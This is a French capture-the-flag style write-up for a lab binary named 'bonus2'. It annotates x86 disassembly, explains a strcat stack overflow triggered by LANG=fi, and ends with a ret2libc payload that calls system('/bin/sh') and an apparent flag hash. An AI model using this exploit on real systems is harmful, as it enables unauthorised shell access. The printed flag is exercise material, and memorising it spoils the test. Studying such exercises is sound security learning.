```
08048484 <greetuser>:
 8048484:	55                   	push   ebp
 8048485:	89 e5                	mov    ebp,esp
 8048487:	83 ec 58             	sub    esp,0x58					; 88
 804848a:	a1 88 99 04 08       	mov    eax,ds:0x8049988			; int *global_1
 804848f:	83 f8 01             	cmp    eax,0x1
 8048492:	74 26                	je     80484ba <greetuser+0x36> ; if (global_1 == 1) ("fi")
 8048494:	83 f8 02             	cmp    eax,0x2
 8048497:	74 50                	je     80484e9 <greetuser+0x65>	; if (global_1 == 2) ("nl")
 8048499:	85 c0                	test   eax,eax
 804849b:	75 6d                	jne    804850a <greetuser+0x86>	; if (global_1 != 0)
 804849d:	ba 10 87 04 08       	mov    edx,0x8048710			; "Hello "
 80484a2:	8d 45 b8             	lea    eax,[ebp-0x48]			; char result[72];
 80484a5:	8b 0a                	mov    ecx,DWORD PTR [edx]
 80484a7:	89 08                	mov    DWORD PTR [eax],ecx		; *eax = "Hell"
 80484a9:	0f b7 4a 04          	movzx  ecx,WORD PTR [edx+0x4]
 80484ad:	66 89 48 04          	mov    WORD PTR [eax+0x4],cx	; eax + 4 = "o "
 80484b1:	0f b6 52 06          	movzx  edx,BYTE PTR [edx+0x6]	; edx + 6 = \0
 80484b5:	88 50 06             	mov    BYTE PTR [eax+0x6],dl	; result = "Hello "
 80484b8:	eb 50                	jmp    804850a <greetuser+0x86>
 80484ba:	ba 17 87 04 08       	mov    edx,0x8048717			; "Hyvää päivää "
 80484bf:	8d 45 b8             	lea    eax,[ebp-0x48]			; char result[72];
 80484c2:	8b 0a                	mov    ecx,DWORD PTR [edx]
 80484c4:	89 08                	mov    DWORD PTR [eax],ecx		; *eax = 0x8048717
 80484c6:	8b 4a 04             	mov    ecx,DWORD PTR [edx+0x4]
 80484c9:	89 48 04             	mov    DWORD PTR [eax+0x4],ecx	; eax + 4 = edx + 4
 80484cc:	8b 4a 08             	mov    ecx,DWORD PTR [edx+0x8]
 80484cf:	89 48 08             	mov    DWORD PTR [eax+0x8],ecx	; eax + 8 = edx + 8
 80484d2:	8b 4a 0c             	mov    ecx,DWORD PTR [edx+0xc]
 80484d5:	89 48 0c             	mov    DWORD PTR [eax+0xc],ecx	; eax + 12 = edx + 12
 80484d8:	0f b7 4a 10          	movzx  ecx,WORD PTR [edx+0x10]
 80484dc:	66 89 48 10          	mov    WORD PTR [eax+0x10],cx	; eax + 16 = edx
 80484e0:	0f b6 52 12          	movzx  edx,BYTE PTR [edx+0x12]
 80484e4:	88 50 12             	mov    BYTE PTR [eax+0x12],dl	; eax + 18 = edx
 80484e7:	eb 21                	jmp    804850a <greetuser+0x86>
 80484e9:	ba 2a 87 04 08       	mov    edx,0x804872a			; edx = "Goedemiddag! "
 80484ee:	8d 45 b8             	lea    eax,[ebp-0x48]			; char result[72];
 80484f1:	8b 0a                	mov    ecx,DWORD PTR [edx]
 80484f3:	89 08                	mov    DWORD PTR [eax],ecx		; result = "Goedemiddag! "
 80484f5:	8b 4a 04             	mov    ecx,DWORD PTR [edx+0x4]
 80484f8:	89 48 04             	mov    DWORD PTR [eax+0x4],ecx
 80484fb:	8b 4a 08             	mov    ecx,DWORD PTR [edx+0x8]
 80484fe:	89 48 08             	mov    DWORD PTR [eax+0x8],ecx
 8048501:	0f b7 52 0c          	movzx  edx,WORD PTR [edx+0xc]
 8048505:	66 89 50 0c          	mov    WORD PTR [eax+0xc],dx
 8048509:	90                   	nop
 804850a:	8d 45 08             	lea    eax,[ebp+0x8]
 804850d:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048511:	8d 45 b8             	lea    eax,[ebp-0x48]
 8048514:	89 04 24             	mov    DWORD PTR [esp],eax
 8048517:	e8 54 fe ff ff       	call   8048370 <strcat@plt>		; strcat(result, ebp+0x8)
 804851c:	8d 45 b8             	lea    eax,[ebp-0x48]
 804851f:	89 04 24             	mov    DWORD PTR [esp],eax
 8048522:	e8 69 fe ff ff       	call   8048390 <puts@plt>		; puts(result)
 8048527:	c9                   	leave  
 8048528:	c3                   	ret    

08048529 <main>:
 8048529:	55                   	push   ebp
 804852a:	89 e5                	mov    ebp,esp
 804852c:	57                   	push   edi
 804852d:	56                   	push   esi
 804852e:	53                   	push   ebx
 804852f:	83 e4 f0             	and    esp,0xfffffff0
 8048532:	81 ec a0 00 00 00    	sub    esp,0xa0					; 160
 8048538:	83 7d 08 03          	cmp    DWORD PTR [ebp+0x8],0x3	; if (argc == 3)
 804853c:	74 0a                	je     8048548 <main+0x1f>		; else return 1;
 804853e:	b8 01 00 00 00       	mov    eax,0x1
 8048543:	e9 e8 00 00 00       	jmp    8048630 <main+0x107>
 8048548:	8d 5c 24 50          	lea    ebx,[esp+0x50]			; 80 = char str[80]
 804854c:	b8 00 00 00 00       	mov    eax,0x0
 8048551:	ba 13 00 00 00       	mov    edx,0x13
 8048556:	89 df                	mov    edi,ebx
 8048558:	89 d1                	mov    ecx,edx
 804855a:	f3 ab                	rep stos DWORD PTR es:[edi],eax	; memset(str, 0, 19);
 804855c:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804855f:	83 c0 04             	add    eax,0x4
 8048562:	8b 00                	mov    eax,DWORD PTR [eax]		; char *argv[1];
 8048564:	c7 44 24 08 28 00 00 	mov    DWORD PTR [esp+0x8],0x28
 804856b:	00 
 804856c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048570:	8d 44 24 50          	lea    eax,[esp+0x50]
 8048574:	89 04 24             	mov    DWORD PTR [esp],eax
 8048577:	e8 44 fe ff ff       	call   80483c0 <strncpy@plt>	; strncpy(str, argv[1], 40);
 804857c:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804857f:	83 c0 08             	add    eax,0x8
 8048582:	8b 00                	mov    eax,DWORD PTR [eax]		; char *argv[2];
 8048584:	c7 44 24 08 20 00 00 	mov    DWORD PTR [esp+0x8],0x20
 804858b:	00 
 804858c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048590:	8d 44 24 50          	lea    eax,[esp+0x50]
 8048594:	83 c0 28             	add    eax,0x28
 8048597:	89 04 24             	mov    DWORD PTR [esp],eax
 804859a:	e8 21 fe ff ff       	call   80483c0 <strncpy@plt>		; strncpy(str + 40, argv[2], 32); // str filled at 72
 804859f:	c7 04 24 38 87 04 08 	mov    DWORD PTR [esp],0x8048738	; "LANG"
 80485a6:	e8 d5 fd ff ff       	call   8048380 <getenv@plt>			; char *lang_env = getenv("LANG")
 80485ab:	89 84 24 9c 00 00 00 	mov    DWORD PTR [esp+0x9c],eax		; esp + 156 = getenv("LANG") = str + 76
 80485b2:	83 bc 24 9c 00 00 00 	cmp    DWORD PTR [esp+0x9c],0x0		; if (!lang_env)
 80485b9:	00 
 80485ba:	74 5c                	je     8048618 <main+0xef>
 80485bc:	c7 44 24 08 02 00 00 	mov    DWORD PTR [esp+0x8],0x2
 80485c3:	00 
 80485c4:	c7 44 24 04 3d 87 04 	mov    DWORD PTR [esp+0x4],0x804873d	; "fi"
 80485cb:	08 
 80485cc:	8b 84 24 9c 00 00 00 	mov    eax,DWORD PTR [esp+0x9c]
 80485d3:	89 04 24             	mov    DWORD PTR [esp],eax
 80485d6:	e8 85 fd ff ff       	call   8048360 <memcmp@plt>				; memcmp(lang_env, "fi", 2)
 80485db:	85 c0                	test   eax,eax
 80485dd:	75 0c                	jne    80485eb <main+0xc2>				; if (memcmp == 0) {
 80485df:	c7 05 88 99 04 08 01 	mov    DWORD PTR ds:0x8049988,0x1			int *global_1 = 1;
 80485e6:	00 00 00 
 80485e9:	eb 2d                	jmp    8048618 <main+0xef>				; } else {
 80485eb:	c7 44 24 08 02 00 00 	mov    DWORD PTR [esp+0x8],0x2
 80485f2:	00 
 80485f3:	c7 44 24 04 40 87 04 	mov    DWORD PTR [esp+0x4],0x8048740	; "nl"
 80485fa:	08 
 80485fb:	8b 84 24 9c 00 00 00 	mov    eax,DWORD PTR [esp+0x9c]
 8048602:	89 04 24             	mov    DWORD PTR [esp],eax
 8048605:	e8 56 fd ff ff       	call   8048360 <memcmp@plt>				; memcmp(lang_env, "nl", 2)
 804860a:	85 c0                	test   eax,eax
 804860c:	75 0a                	jne    8048618 <main+0xef>				;	if (memcmp == 0)
 804860e:	c7 05 88 99 04 08 02 	mov    DWORD PTR ds:0x8049988,0x2		;		int *global_1 = 2;
 8048615:	00 00 00 
 8048618:	89 e2                	mov    edx,esp							; }
 804861a:	8d 5c 24 50          	lea    ebx,[esp+0x50]
 804861e:	b8 13 00 00 00       	mov    eax,0x13
 8048623:	89 d7                	mov    edi,edx
 8048625:	89 de                	mov    esi,ebx			; esi = str
 8048627:	89 c1                	mov    ecx,eax
 8048629:	f3 a5                	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]	; memmove(lang_env || esp, str, 19);
 804862b:	e8 54 fe ff ff       	call   8048484 <greetuser>
 8048630:	8d 65 f4             	lea    esp,[ebp-0xc]
 8048633:	5b                   	pop    ebx
 8048634:	5e                   	pop    esi
 8048635:	5f                   	pop    edi
 8048636:	5d                   	pop    ebp
 8048637:	c3                   	ret
```

Du coup, on peut overflow la variable nommée `str_store` dans le programme `.c`. Elle contiendra au maximum 72 caractères.
Or, si on donne `fi` en variable d'environnement `LANG`, alors les 19 premiers octets sont pris, ce qui laisse 53 caractère à overflow.

Pour rappel, dans le main on rempli un buffer de 76 caractères disponibles, et on peut en écrire 72. Par conséquent, on peut overflow d'au maximum 18 caractères.
La question sera de savoir si le shell code est conservé ou non après.

Répartition de la mémoire dans le programme :
```
char str[76]:
[0 <- argv[1] -> 40 <- argv[2] -> 72]

char str_store[72]:
[0 <- local_str -> 19 <- str -> 91]

[0 <- local_str -> 19 <- argv[1] -> 59 <- argv[2] -> 91]
```

Il ne reste plus qu'à déterminer l'adresse 0 (`ebp-0x48`) avec gdb:
`0xbffff4f0`

Donc notre adresse sera : `0xbffff503`.

L'idée est donc:
1. Définir `LANG=fi`
2. Écrire n'importe quoi dans `argv[1]`
3. Écrire 18 caractères dans `argv[2]`
4. Écrire l'adresse `\x03\xf5\xff\xbf`

Au vu de la place qu'on a dans la stack, c'est probablement une `ret2libc`. Il me faut juste vérifier que ça segfault au bon endroit.

Après avoir run le code, segfault à `bffff5` (`demsg`).

Adresse de `system` (`"\x60\xb0\xe6\xb7"`) et `/bin/sh` (`"\x58\xcc\xf8\xb7"`)

```
(gdb) x/1s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
(gdb) x/10xw system
0xb7e6b060 <system>:	0x891cec83 [...]
```

L'idée est donc:
1. Définir `LANG=fi`
2. Écrire n'importe quoi dans `argv[1]`
3. Écrire 18 caractères dans `argv[2]`
4. Écrire l'adresse `\x60\xb0\xe6\xb7`
4. Écrire des NOP codes pour l'adresse de retour `\x90\x90\x90\x90`
4. Écrire l'argument `\x58\xcc\xf8\xb7`

```sh
export LANG=fi
./bonus2 `python -c 'print "A" * 41'` `python -c 'print "A" * 18 + "\x60\xb0\xe6\xb7\x90\x90\x90\x90\x58\xcc\xf8\xb7"'`
```

`71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
